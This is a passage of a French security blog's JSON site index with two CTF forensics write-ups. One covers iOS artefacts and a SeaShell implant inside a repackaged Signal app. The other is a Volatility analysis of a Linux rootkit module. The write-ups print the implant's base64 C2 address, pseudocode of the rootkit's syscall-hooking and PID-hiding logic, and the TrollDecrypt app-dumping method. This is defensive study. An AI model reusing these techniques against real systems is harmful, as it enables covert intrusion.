connect√© sur le r√©seau WiFi example, qui a pour BSSID 00:11:22:33:44:55 et que le compte iCloud associ√© est example@example.com : FCSC{example|00:11:22:33:44:55|example@example.com}.\nAfin d\u0026rsquo;acc√©l√©rer l\u0026rsquo;extraction des informations Wi-Fi et iCloud, on peut utiliser iLEAPP (iOS Logs, Events, and Protobuf Parser) : il va collecter et organiser automatiquement pour nous pleins d\u0026rsquo;artefacts et faire un rapport.\nBref apr√®s avoir fait pass√© l\u0026rsquo;ILEAPP on trouve le SSID \u0026amp; BSSID ici :\nPour le compte iCloud plusieurs mani√®res mais une fa√ßon assez direct avec iLEAPP et de regarder par quel compte les apps ont-elles √©t√© install√© :\nFlag : FCSC{FCSC|66:20:95:6c:9b:37|robertswigert@icloud.com}\n‚≠ê‚≠ê - iForensics - iTreasure #\rAvant la remise du t√©l√©phone √† la douane, le propri√©taire du t√©l√©phone a eu le temps d\u0026rsquo;envoyer un tr√©sor. Retrouvez ce tr√©sor.\nIci plusieurs mani√®res rapide de le trouver. En effet le sc√©nario parle d\u0026rsquo;un envoi. On pense directement au SMS.\niLEAPP parse cela donc on peut aller checker directement :\nOn peut aussi le faire ing√©rer √† Autopsy avec le module \u0026ldquo;Logical File Analysis\u0026rdquo;. Gr√¢ce √† cela, Autopsy va scanner tous les fichiers et, d\u0026rsquo;apr√®s leurs en-t√™tes (magic bytes), il va regrouper certains des m√©dias (JPEG, PNG, etc.) sous l\u0026rsquo;onglet \u0026ldquo;User Content Suspected\u0026rdquo; car le Chemin d\u0026rsquo;acc√®s est localis√© dans HomeDomain/Media/DCIM/‚Ä¶. Il consid√®re donc qu\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;un contenu utilisateur (photo prise ou import√©e)\nFlag : FCSC{511773550dca}\n‚≠ê‚≠ê - iForensics - iNvisible #\rIl semblerait qu\u0026rsquo;un message n\u0026rsquo;ait pas pu s\u0026rsquo;envoyer ‚Ä¶ Retrouvez le destinataire de ce message. Le flag est au format FCSC{}. Par exemple, si le destinataire est example@example.com : FCSC{example@example.com}.\nIci tr√®s rapide, on peut directement aller chercher dans la DB sms.db. C\u0026rsquo;est cette base qui contient toutes les conversations (iMessage et SMS), avec les tables principales message (headers, √©tat, texte, etc.) et handle (liste des correspondants, num√©ros / adresses).\nNe faites pas l\u0026rsquo;erreur d\u0026rsquo;aller chercher dans la table \u0026ldquo;message\u0026rdquo;. En effet, on ne retrouve que les iMessage ici. Pour les SMS il faut aller dans la table \u0026ldquo;chat\u0026rdquo;.\nFlag : FCSC{kristy.friedman@outlook.com}\n‚≠ê‚≠ê - iForensics - iBackdoor 1/2 #\rVous continuez vos analyses afin de trouver la backdoor sur le t√©l√©phone. Vous finissez par vous rendre compte qu\u0026rsquo;une application est compromise et que le t√©l√©phone √©tait infect√© au moment de la collecte ‚Ä¶ Trouvez l\u0026rsquo;identifiant de l\u0026rsquo;application compromise ainsi que l\u0026rsquo;identifiant de processus (PID) du malware.\nLe flag est au format FCSC{|}. Par exemple, si l\u0026rsquo;application compromise est Example (com.example) et que le PID est 1337 : FCSC{com.example|1337}.\nIci on va devoir s\u0026rsquo;appuyer sur les sysdiagnose (/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362).\nMais avant c\u0026rsquo;est quoi les sysdiagnose ? C\u0026rsquo;est une archive g√©n√©r√©e par iOS qui regroupe automatiquement les logs syst√®me, rapports de crash, √©tats r√©seau et informations de configuration au moment de la capture. Il sert principalement √† diagnostiquer des probl√®mes de performance ou de stabilit√© en fournissant un instantan√© complet de l\u0026rsquo;appareil. Mais il est aussi tr√®s utile d\u0026rsquo;un point de vu forensic apr√®s une compromission.\nPour √™tre un minimum pro et gagner du temps je vais utiliser le superbe tool EC-DIGIT-CSIRC/sysdiagnose https://github.com/EC-DIGIT-CSIRC/sysdiagnose.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(kali„âøkali)-[~/sysdiagnose] ‚îî‚îÄ$ sysdiag create /mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz Sysdiagnose file has been processed: /mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz Case \u0026#39;C39ZL6V1N6Y6_20250407_080618\u0026#39; created successfully from \u0026#39;/mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz\u0026#39; On voit bien que la case a √©t√© cr√©√© :\nOn fait passer le parser \u0026ldquo;ps\u0026rdquo; car tr√®s utile dans ce contexte. En effet analyser le contenu de ps.txt (le listing des processus) permet :\nD\u0026rsquo;avoir une visibilit√© sur tous les processus en cours : Le ps.txt fournit un instantan√© de tout ce qui tourne sur l\u0026rsquo;iPhone (y compris les ex√©cutables cach√©s ou lanc√©s par des services syst√®me). Sans ce listing, un malware qui se dissimule derri√®re un nom trompeur ou dans un r√©pertoire non standard pourrait passer inaper√ßu.\nD√©tection d\u0026rsquo;anomalies dans les privil√®ges En regardant les colonnes user/uid et ppid, on rep√®re rapidement quand un processus tiers (par exemple extrait d\u0026rsquo;une app tierce) s\u0026rsquo;ex√©cute sous l\u0026rsquo;utilisateur root (UID 0). Or, une app normale ne devrait jamais obtenir un tel niveau de privil√®ges sans passer par un m√©canisme officiel.\nIdentification de commandes et arguments suspects Le champ command montre l\u0026rsquo;ex√©cutable et ses arguments. Tout binaire inconnu (comme ce qu\u0026rsquo;on verra par la suite) ou toute URL cod√©e (Base64 ou autre) est imm√©diatement visible et peut √™tre d√©cod√©/inspect√©.\nTracking temporel et contexte Avec la date/heure (started, datetime) et les champs de performance (%cpu, %mem), on sait si un processus a d√©marr√© anormalement t√¥t (au boot) ou s\u0026rsquo;il consomme des ressources pour exfiltrer des donn√©es, m√™me si √ßa reste √† 0 % pour masquer son activit√©.\nCorroboration avec d\u0026rsquo;autres modules de sysdiagnose Le ps.txt s\u0026rsquo;int√®gre √† l\u0026rsquo;ensemble des autres dumps (r√©seau, fichiers ouverts, configurations). On peut croiser : \u0026ldquo;X processus root vers IP Y\u0026rdquo; + \u0026ldquo;connexion r√©seau vers Y\u0026rdquo; + \u0026ldquo;fichiers cr√©√©s dans Z\u0026rdquo; pour construire un fil d\u0026rsquo;attaque.\nOn voit donc ceci :\nroot ‚Ä¶ 279 1 ‚Ä¶ /var/containers/Bundle/Application/‚Ä¶/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== root ‚Ä¶ 330 1 ‚Ä¶ /var/containers/Bundle/Application/‚Ä¶/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== root ‚Ä¶ 345 344 ‚Ä¶ /var/containers/Bundle/Application/‚Ä¶/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== 1. Binaire \u0026ldquo;mussel\u0026rdquo; ‚Äì Un fichier mussel embarqu√© dans l\u0026rsquo;app Signal est inhabituel : ce n\u0026rsquo;est pas un d√©mon standard d\u0026rsquo;iOS.\n2. Ex√©cution en root ‚Äì Il tourne avec l\u0026rsquo;UID 0 (root), ce qui est extr√™mement suspect pour un composant d\u0026rsquo;application tierce.\n3. Argument cod√© en Base64 ‚Äì dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== est une cha√Æne Base64 qui, d√©cod√©e, donne tcp://98.66.154.235:29552, un canal TCP vers une IP externe, sans doute un C2.\n4. Comportement typique d\u0026rsquo;un spyware ‚Äì Un d√©mon inconnu qui s\u0026rsquo;ex√©cute en root et ouvre une connexion vers un h√¥te externe ressemble fortement √† un implant malveillant ou spyware.\nAnswer : FCSC{org.whispersystems.signal|345}\n‚≠ê‚≠ê - iForensics - iBackdoor 2/2 #\rMaintenant que vous savez quelle application a √©t√© compromise, retrouvez comment est-ce que l\u0026rsquo;attaquant a r√©cup√©r√© l\u0026rsquo;application l√©gitime, pr√©alablement √† l\u0026rsquo;infection. Il vous faudra retrouver :\nL\u0026rsquo;identifiant de l\u0026rsquo;application utilis√©e pour r√©cup√©rer l\u0026rsquo;application l√©gitime; Le chemin utilis√© pour stocker l\u0026rsquo;application l√©gitime; La date de d√©sinstallation de l\u0026rsquo;application l√©gitime (en heure locale). Le flag est au format FCSC{||}. Par exemple, si l\u0026rsquo;application utilis√©e est Example (com.example), que le chemin est /private/var/tmp/test.xyz et que la date de d√©sinstallation est 2025-01-01 01:00:00 : FCSC{com.example|/private/var/tmp/test.xyz|2025-01-01 01:00:00}.\nRemettons les choses √† plat :\non sait que c\u0026rsquo;est Signal l\u0026rsquo;app en question on sait qu\u0026rsquo;elle a √©t√© lanc√© vers 7:47AM on doit trouver le chemin de l\u0026rsquo;app, ce qui a \u0026ldquo;r√©cup√©r√©\u0026rdquo; / install√© l\u0026rsquo;app l√©gitime et la date de d√©sinstallation Pour cela je me suis directement dirig√© vers les mobileinstallation.\nEn effet, c\u0026rsquo;est la couche d\u0026rsquo;iOS responsable de l\u0026rsquo;installation, la mise √† jour et d√©sinstallation des apps.\nOn pourra y retrouver :\nles timestamps pr√©cis (timestamp + datetime) les bundle id les d√©tails du process d\u0026rsquo;uninstall les erreurs et leur contexte Bingo : // √† 07:40:47-07:00, premi√®re d√©sinstallation de Signal { \u0026#34;datetime\u0026#34;: \u0026#34;2025-04-07T07:40:47.000000-07:00\u0026#34;, \u0026#34;event_type\u0026#34;: \u0026#34;MIClientConnection _uninstallIdentities\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Uninstall requested by installcoordinationd ... for identity [org.whispersystems.signal]\u0026#34; } // √† la m√™me seconde, on d√©truit ses containers : \u0026#34;message\u0026#34;: \u0026#34;Destroying container org.whispersystems.signal ... at /private/var/containers/Bundle/Application/1EC20F02-...\u0026#34; // √† 07:43:55, d√©sinstallation de l\u0026#39;outil com.fiore.trolldecrypt { \u0026#34;datetime\u0026#34;: \u0026#34;2025-04-07T07:43:55.000000-07:00\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Uninstalling identifier com.fiore.trolldecrypt\u0026#34; // puis destruction du bundle container correspondant } On sait donc maintenant que l\u0026rsquo;attaquant a utilis√© TrollDecrypt qui est utilitaire opensource destin√© aux appareils iOS √©quip√©s de TrollStore. Il permet de d√©chiffrer √† la vol√©e les applications install√©es (IPA prot√©g√©es par FairPlay DRM) directement sur l\u0026rsquo;appareil, sans n√©cessiter de jailbreak. Concr√®tement, il :\nscanne la liste des apps install√©es sur l\u0026rsquo;iDevice via TrollStore d√©chiffre le binaire FairPlay de l\u0026rsquo;application cibl√©e emballe le r√©sultat dans un fichier .ipa exploitable (pour analyses, r√©installations, sideloading, etc.) TrollStore exploite une faille CoreTrust pour signer √† vie n\u0026rsquo;importe quelle IPA. TrollDecrypt s\u0026rsquo;appuie dessus pour lancer l\u0026rsquo;app cibl√©e, dumper sa m√©moire et sortir un IPA FairPlay free. D\u0026rsquo;o√π la pr√©sence du dossier /Library/TrollDecrypt/decrypted/.\nJ\u0026rsquo;avoue qu\u0026rsquo;il y aurait mille fa√ßons intelligentes de pivoter, analyser et trouver le path de stockage de l\u0026rsquo;app l√©gitime mais il y a plus rapide. Dans un contexte de CTF √ßa compte.\nChercher un .ipa tout simplement.\nCe qui donne pour une timeline tr√®s succincte :\n07h40m47s : d√©sinstallation de Signal (log MI) 07h40‚Äì42m : dump ‚Üí Signal_7.53_decrypted.ipa (fslisting) 07h43m55s : d√©sinstallation de TrollDecrypt (log MI) 07h47mxxs : lancement de l\u0026rsquo;IPA repack√©e (unified log) On a d√©sormais tout pour cr√©er le flag.\nFlag : FCSC{com.fiore.trolldecrypt|/private/var/mobile/Library/TrollDecrypt/decrypted/Signal_7.53_decrypted.ipa|2025-04-07 07:40:47}\n‚≠ê‚≠ê‚≠ê - iForensics - iC2 #\rRetrouvez le nom de l\u0026rsquo;outil malveillant d√©ploy√© sur le t√©l√©phone, ainsi que le protocole, l\u0026rsquo;adresse IP et le port de communication vers le serveur C2.\nLe flag est au format FCSC{|||}. Par exemple, si l\u0026rsquo;outil est Cobalt Strike, le protocole TCP, l\u0026rsquo;adresse IP 127.0.0.1 et le port 1337 : FCSC{Cobalt Strike|TCP|127.0.0.1|1337}.\nJe me suis donc renseign√© davantage sur TrollStore et les actualit√©s int√©ressantes li√©es. Je suis tomb√© sur cette article : https://idevicecentral.com/news/ios-malware-makes-trollstore-users-vulnerable-to-monitoring-file-extraction-remote-control-on-ios-14-ios-17/\nOn a d√©j√† r√©cup√©r√© le protocol, l\u0026rsquo;IP et le port plus t√¥t donc c\u0026rsquo;est simple :\nFlag : FCSC{SeaShell|TCP|98.66.154.235|29552}\n","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/posts/fcsc/","section":"Posts","summary":"Sc√©nario #\rLors d\u0026rsquo;un passage de douane, le douanier vous demande de lui remettre votre t√©l√©phone ainsi que son code de d√©verrouillage.","title":"FCSC 2025 - iOS Forensic","type":"posts"},{"content":"","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/tags/ios/","section":"Tags","summary":"","title":"IOS","type":"tags"},{"content":"\rSc√©nario #\r√Ä l\u0026rsquo;issue du processus de r√©cup√©ration du serveur, l\u0026rsquo;√©quipe IR a mis en √©vidence un r√©seau complexe de trafic persistant, de communications furtives et de processus tenaces ayant r√©sist√© √† nos tentatives d\u0026rsquo;arr√™t. Il est √©vident que la port√©e de l\u0026rsquo;incident d√©passe la violation initiale de nos serveurs et de nos clients. En tant qu\u0026rsquo;expert en forensic, pouvez-vous √©clairer les ombres qui cachent ces activit√©s clandestines ?\nSetup #\rPour ce Sherlock nous allons utiliser :\nVolatility2 IDA Nous allons √©galement nous appuyer sur cette cheatsheet :\nhttps://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf Profil volatility #\rPremi√®rement on doit installer python2, volatility2 et ajouter le profil n√©cessaire.\nUn profil Volatility est un fichier contenant des informations structurelles sur le syst√®me d\u0026rsquo;exploitation cible. Pour simplifier, c\u0026rsquo;est comme une \u0026ldquo;carte\u0026rdquo; qui permet √† Volatility de comprendre comment les donn√©es sont organis√©es dans la m√©moire d\u0026rsquo;un syst√®me sp√©cifique.\nCe profil contient principalement deux types d\u0026rsquo;informations :\nles d√©finitions des structures de donn√©es du kernel les symboles du kernel (adresses des fonctions et variables) Installation :\nsudo apt install -y python2 python2-dev build-essential libdistorm3-dev libssl-dev libffi-dev zlib1g-dev curl -sS https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py sudo python2 get-pip.py sudo python2 -m pip install --upgrade pip setuptools wheel sudo python2 -m pip install distorm3 pycrypto openpyxl pillow yara-python git clone https://github.com/volatilityfoundation/volatility.git cd volatility python2 vol.py -h Profil :\ncp Ubuntu_5.3.0-70-generic_profile.zip /home/kali/Documents/volatility/volatility/plugins/overlays/linux/ python2 vol.py --info | grep Linux Question 1 #\rQuels sont les IP et le port utilis√©s par l\u0026rsquo;attaquant pour le reverse shell ?\nPour cela on va utiliser le module linux_netstat de volatility qui permet d\u0026rsquo;extraire et afficher toutes les connexions r√©seaux qui √©taient pr√©sentes lors de la capture m√©moire. On va rediriger l\u0026rsquo;output dans un fichier pour faciliter la recherche via un √©diteur de texte / IDE etc.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_netstat \u0026gt; netstat.txt Sous Linux, le plus probable est de retrouver un reverse shell bash particuli√®rement basique, et effectivement :\nR√©ponse : 10.0.2.6:443\nQuestion 2 #\rQuel √©tait le PPID de la connexion malveillante du reverse shell ?\nTout d\u0026rsquo;abord, testons avec ``linux_pstree` :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_pstree | grep -C 5 3633 Pas de PPID. Pourquoi ? Le plugin linux_pstree reconstruit l\u0026rsquo;arborescence des processus en se basant principalement sur une seule source d\u0026rsquo;information : la liste des t√¢ches actives du syst√®me (task_struct).\nhttps://makelinux.github.io/kernel/map/\nOn va donc plut√¥t utiliser le plugin linux_psxview qui est con√ßu sp√©cifiquement pour d√©tecter les processus cach√©s. Il utilise plusieurs sources pour idenfifier les processus :\ntask_struct list : la m√™me liste de t√¢ches utilis√©e par linux_pstree pid hash table : une structure de hachage utilis√©e par le kernel pour rechercher rapidement les processus par PID pslist : liste des processus extraite d\u0026rsquo;autres sources m√©moire kmem_cache : cache du kernel qui peut contenir des r√©f√©rences aux processus d_path : informations sur les processus tir√©es du syst√®me de fichiers procfs thread_info : informations des threads qui peuvent r√©v√©ler des processus cach√©s Il compare ensuite les r√©sultats de ces diff√©rentes sources et signale les incoh√©rences, par exemple lorsqu\u0026rsquo;un processus appara√Æt dans une source mais pas dans une autre.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_psxview \u0026gt; psxview.txt Et logiquement, on se doute bien que le parent est le PID juste avant.\nMais pourquoi le cacher ? Au vu du sc√©nario, on sait que l\u0026rsquo;on a √† faire √† un rootkit. Ce qui s\u0026rsquo;est probablement pass√© c\u0026rsquo;est que le rootkit a modifi√© la liste des t√¢ches (task_struct list) en \u0026ldquo;d√©connectant\u0026rdquo; son processus de reverse shell de cette liste cha√Æn√©e. Concr√®tement, il a manipul√© les pointeurs next et prev de cette liste pour que son processus soit ignor√© lors du parcours de la liste.\nCependant, le rootkit n\u0026rsquo;a pas r√©ussi √† effacer toutes les traces de son existence. Il a omis de modifier une ou plusieurs des autres structures surveill√©es par linux_psxview.\nLe r√©sultat est que linux_pstree, qui ne se fie qu\u0026rsquo;√† la liste des t√¢ches, ne voit pas le processus malveillant, tandis que linux_psxview, qui v√©rifie plusieurs sources, le d√©tecte via les structures que le rootkit a n√©glig√© de modifier.\nR√©ponse : 3632\nQuestion 3 #\rIndiquer le nom du module malveillant du kernel.\nPour cela on va utiliser le plugin linux_check_modules. Mais avant, remettons en contexte qu\u0026rsquo;est-ce qu\u0026rsquo;un module kernel et quel est le lien avec un rootkit.\nUn module kernel c\u0026rsquo;est un morceau de code qui peut √™tre charg√© et d√©charg√© dynamiquement dans le kernel d\u0026rsquo;un syst√®me d\u0026rsquo;exploitation en cours d\u0026rsquo;ex√©cution. Cela permet d\u0026rsquo;√©tendre ses fonctionnalit√©s (comme la prise en charge de nouveaux p√©riph√©riques ou syst√®mes de fichiers) sans devoir red√©marrer ou recompiler compl√®tement le kernel.\nLes rootkits op√®rent au niveau du kernel Linux en ins√©rant leurs propres modules kernel (LKM - Loadable Kernel Modules). Ces modules malveillants peuvent:\nintercepter les appels syst√®me pour dissimuler des fichiers, processus ou connexions √©tablir des backdoors persistantes dans le syst√®me d√©sactiver certaines fonctionnalit√©s de s√©curit√© du kernel masquer leur propre pr√©sence aux outils standard du syst√®me etc. Concernant le plugin volatility linux_check_modules. Il est con√ßu pour d√©tecter les LKM cach√© en comparant encore une fois diff√©rente sources d\u0026rsquo;information du kernel.\n1. Analyse de la liste officielle des modules\nTout d\u0026rsquo;abord, le plugin examine la liste des modules officiellement charg√©s (modules.list). Cette liste circulairement cha√Æn√©e est maintenue par le kernel et contient tous les modules l√©gitimement charg√©s. Elle est accessible via la commande lsmod.\n2. Analyse des symboles du kernel\nEnsuite, il parcourt la table des symboles du kernel (accessible via /proc/kallsyms). Cette table contient les adresses de toutes les fonctions et variables du kernel, y compris celles introduites par des modules charg√©s.\n3. Analyse de la section modulaire .ko\nLe plugin examine √©galement les sections m√©moire o√π les modules kernel (.ko) sont typiquement charg√©s, recherchant les signatures caract√©ristiques des modules m√™me s\u0026rsquo;ils ne sont pas r√©f√©renc√©s ailleurs.\n4. Techniques de d√©tection des modules cach√©s\nla technique principale consiste √† comparer les modules trouv√©s dans la liste officielle avec ceux d√©tect√©s par l\u0026rsquo;analyse des symboles ou des sections m√©moire. Un module pr√©sent dans une source mais absent de la liste officielle est probablement cach√© intentionnellement. le plugin examine √©galement la table des appels syst√®me (syscall table) pour d√©tecter si des fonctions originales ont √©t√© remplac√©es par des versions modifi√©es - une technique courante des rootkits pour intercepter les interactions avec le kernel. il v√©rifie si les adresses des fonctions de modules pointent vers des r√©gions m√©moire suspectes ou non standard, ce qui pourrait indiquer du code inject√©. les attributs des modules sont analys√©s (comme l\u0026rsquo;horodatage, le nom, l\u0026rsquo;auteur) pour d√©tecter des informations incoh√©rentes ou inhabituelles. Ok c\u0026rsquo;est cool mais comment les rootkit se cache au fait ?\nIl y a beaucoup de technique diff√©rente mais on retrouve g√©n√©ralement :\nDKOM (Direct Kernel Object Manipulation) : Ils modifient les structures de donn√©es du kernel en m√©moire pour retirer leur module de la liste modules.list, tout en laissant le module fonctionnel.\nHooks de syscall : Ils remplacent les fonctions l√©gitimes du kernel par leurs propres versions qui filtrent les r√©sultats (par exemple, une version modifi√©e de read qui ne montre jamais certains fichiers).\nModule sans nom : Certains modules malveillants utilisent des cha√Ænes vides ou des caract√®res sp√©ciaux comme nom pour compliquer leur d√©tection.\nEnfin bref, revenons √† la question.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_check_modules Le nom \u0026ldquo;nfentlink\u0026rdquo; est une tentative de camouflage d\u0026rsquo;un module malveillant en se faisant passer pour \u0026ldquo;nfnetlink\u0026rdquo;, qui est un module kernel l√©gitime de Linux utilis√© pour la communication entre l\u0026rsquo;espace kernel et l\u0026rsquo;espace utilisateur pour le firewall et le r√©seau.\nR√©ponse : nfentlink\nQuestion 4 #\rQuand est-ce que le module a √©t√© charg√© ?\nAu d√©part, j\u0026rsquo;√©tais parti sur une mauvaise piste. Ma pens√©e √©tait :\nprendre le timestamp du chargement du module dans dmesg via linux_dmesg prendre le timestamp du boot dans linux_pslist calculer et hop Cela aurait fonctionn√© si c\u0026rsquo;√©tait la premi√®re fois que le module √©tait charg√©. N√©anmoins, il a d√©j√† √©t√© charg√© dans le pass√©. Cette m√©thode est intrins√®quement mauvaise et peut induire en erreur dans un contexte de r√©ponse √† incident.\nAu final j\u0026rsquo;ai remis tout √† plat et je me suis dit \u0026ldquo;o√π puis-je trouver des timestamp li√© √† des actions pass√©es apr√®s de multiple boot ?\u0026rdquo;.\nLes logs syst√®mes √©videmment. Tout particuli√®rement /var/log/kern.log ou /var/log/syslog.log.\nPour r√©cup√©rer ces fichiers on va premi√®rement √©num√©rer les fichiers dans la capture m√©moire :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_enumerate_files \u0026gt; files.txt Et en effet on retrouve bien : Ensuite, pour extraire /var/log/kern.log on va :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea5a732fa8 -O kern.log R√©ponse : 2024-05-01 20:42:57\nQuestion 5 #\rQuel est le chemin d\u0026rsquo;acc√®s complet et le nom du fichier du module du kernel malveillant ?\nDe m√™me, v√©rifions parmi les fichiers √©num√©r√©s. Premi√®rement on cherche le module qu\u0026rsquo;on a identifi√© \u0026ldquo;nfentlink\u0026rdquo;.\ncat files.txt |grep nfentlink √ßa ne donne rien d\u0026rsquo;int√©ressant.\nOn va donc chercher le module qui a le vrai nom pour voir :\nOn va revenir sur le deuxi√®me fichier plus tard.\nR√©ponse : /lib/modules/5.3.0-70-generic/kernel/drivers/net/nfnetlink.ko\nQuestion 6 #\rQuel est le hash MD5 du fichier du module malveillant ?\nIl suffit d\u0026rsquo;extraire le fichier et calculer son hash :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea266b5a68 -O nfnetlink.ko md5sum nfnetlink.ko R√©ponse : 35bd8e64b021b862a0e650b13e0a57f7\nQuestion 7 #\rQuel est le chemin d\u0026rsquo;acc√®s complet et le nom du fichier du module du kernel l√©gitime ?\nRevenons au screen de la question 5.\nR√©ponse : /lib/modules/5.3.0-70-generic/kernel/net/netfilter/nfnetlink.ko\nQuestion 8 #\rQuelle est la diff√©rence d\u0026rsquo;un seul caract√®re dans la valeur de l\u0026rsquo;auteur entre le module l√©gitime et le module malveillant ?\nPremi√®rement on va checker le l√©gitime via modinfo qui permet d\u0026rsquo;afficher des informations d√©taill√©s sur un module kernel sp√©cifique.\nmodinfo /lib/modules/6.11.2-amd64/kernel/net/netfilter/nfnetlink.ko.xz Ensuite, on check le module kernel qu\u0026rsquo;on a r√©cup√©r√© dans la capture :\nmodinfo malicious-nfnetlink.ko On voit donc bien qu\u0026rsquo;il manque un \u0026ldquo;i\u0026rdquo;.\nR√©ponse : i\nQuestion 9 #\rQuel est le nom de la fonction d\u0026rsquo;initialisation du module du kernel malveillant ?\nPour r√©pondre √† cette question je vais utiliser IDA. C\u0026rsquo;est vraiment overkill, on peut se limiter √† gdb (gef\u0026gt;gdb), radare2 etc.\nOn va donc regarder les fonctions : On voit bien que la fonction d\u0026rsquo;initialisation est nfnetlink_init mais aussi init_module. C\u0026rsquo;est encore plus visible avec gef :\nGef affiche les deux fonctions √† la m√™me adresse m√©moire. On observe donc une technique d√©lib√©r√©e de camouflage utilis√©e par des rootkits au niveau kernel.\nLe module malveillant utilise la fonction standard init_module (qui est l\u0026rsquo;entr√©e obligatoire pour tout module kernel Linux) mais a intentionnellement renomm√© cette fonction en nfnetlink_init pour ressembler au module l√©gitime du kernel.\nLes symboles d\u0026rsquo;exportation comme init_module sont essentiels pour que le kernel Linux puisse charger le module, mais l\u0026rsquo;attaquant a utilis√© des astuces de compilation pour que la m√™me fonction porte deux noms diff√©rents, l\u0026rsquo;un pour le chargement par le kernel et l\u0026rsquo;autre pour le camouflage visuel.\nR√©ponse : nfnetlink_init\nQuestion 10 #\rIl existe une fonction pour hooker les syscall. Quel est le dernier syscall du tableau ?\nDans la fonction nfnetlink_init on voit bien _sys_call_table = kallsyms_lookup_name(\u0026quot;sys_call_table\u0026quot;); :\n_sys_call_table = kallsyms_lookup_name(\u0026#34;sys_call_table\u0026#34;); Cette ligne utilise la fonction kallsym_lookup_name pour obtenir l\u0026rsquo;adresse de la table des syscall sys_call_table dans la m√©moire du kernel.\nsys_call_table est un tableau contenant les pointeurs vers les fonctions des syscall utilis√©s par le kernel. En modifiant cette table, l\u0026rsquo;attaquant redirige les appels syst√®me vers ses propres routines malveillantes.\nOn va donc aller voir le tableau de donn√©es dans la section .rodata (section contenant des cha√Ænes de caract√®res et des donn√©es en lecture seule).\nCe tableau contient des r√©f√©rences √† des symboles qui sont utilis√©es pour diverses manipulations dans le module malicieux.\naX64SysGetdents db \u0026#39;_x64_sys_getdents64\u0026#39;,0 aX64SysGetdents db \u0026#39;_x64_sys_getdents\u0026#39;,0 aX64SysKill db \u0026#39;_x64_sys_kill\u0026#39;,0 Ces cha√Ænes sont des r√©f√©rences aux symboles des fonctions syst√®me que le module va utiliser ou modifier.\nCes fonctions font partie de l\u0026rsquo;API des syscall du kernel Linux, et dans ce cas, elles sont hook√©es ou utilis√©es pour rediriger des appels.\nR√©ponse : __x64_sys_kill\nQuestion 11 #\rQuel num√©ro de signal est utilis√© pour masquer le PID d\u0026rsquo;un processus en cours d\u0026rsquo;ex√©cution lors de l\u0026rsquo;envoi ?\nOn va donc aller voir la fonction hook_kill :\nCe qui retient imm√©diatement notre attention est :\ncmp dword ptr [rdi+68h], 64 ainsi que le hide_pid.\nAllons voir le pseudocode g√©n√©r√© par IDA :\nif ( (*(DWORD *)(a1 + 104)) != 64 ) return ((__int64 (*) (void))orig_kill()); a1 + 104 : cela acc√®de au signal envoy√© avec l\u0026rsquo;appel kill(). Le champ √† l\u0026rsquo;adresse a1 + 104 correspond donc au signal.\n(*(DWORD *)(a1 + 104)) != 64 : cette condition v√©rifie si le signal n\u0026rsquo;est pas √©gal √† 64.\nSi le signal n\u0026rsquo;est pas √©gal √† 64, la fonction ex√©cute la fonction orig_kill (l\u0026rsquo;originale, avant le hook) pour continuer l\u0026rsquo;ex√©cution normale du kernel.\nSinon il fait appel √† hide_pid :\nsprintf(hide_pid, \u0026#34;%d\u0026#34;, *((QWORD *)(a1 + 112))); sprintf(hide_pid, \u0026quot;%d\u0026quot;, ...) : la fonction sprintf est utilis√©e ici pour formater et passer le PID dans la fonction hide_pid. On comprend donc que ce PID est utilis√© par la fonction hide_pid afin de dissimuler le processus au niveau du syst√®me, par exemple en supprimant ses entr√©es dans /proc ou dans d\u0026rsquo;autres structures internes du kernel.\nhide_pid : est la fonction pour cacher un processus, emp√™chant ainsi sa visibilit√©.\n%d : C\u0026rsquo;est un format pour afficher l\u0026rsquo;entier (le PID).\nR√©ponse : 64\nLab termin√© !\n","date":"20 avril 2025","externalUrl":null,"permalink":"/blog-cyber/posts/aptnightmare2/","section":"Posts","summary":"Sc√©nario #\r√Ä l\u0026rsquo;issue du processus de r√©cup√©ration du serveur, l\u0026rsquo;√©quipe IR a mis en √©vidence un r√©seau complexe de trafic persistant, de communications furtives et de processus tenaces ayant r√©sist√© √† nos tentatives d\u0026rsquo;arr√™t.","title":"APTNightmare-2","type":"posts"},{"content":"","date":"20 avril 